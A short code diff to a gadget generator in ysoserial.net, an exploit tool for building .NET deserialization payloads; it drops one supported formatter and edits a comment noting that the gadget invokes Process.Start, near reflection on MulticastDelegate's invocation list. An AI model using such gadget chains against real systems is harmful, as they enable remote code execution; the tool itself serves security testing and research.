@@ -35,7 +35,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer", "LosFormatter" };
+            return new List<string> { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -73,7 +73,7 @@ namespace ysoserial.Generators
             }
             else
             {
-                set.Add(""); // this is needed (as it accepts two args?)
+                set.Add(""); // this is needed (as Process.Start accepts two args)
             }
 
             FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
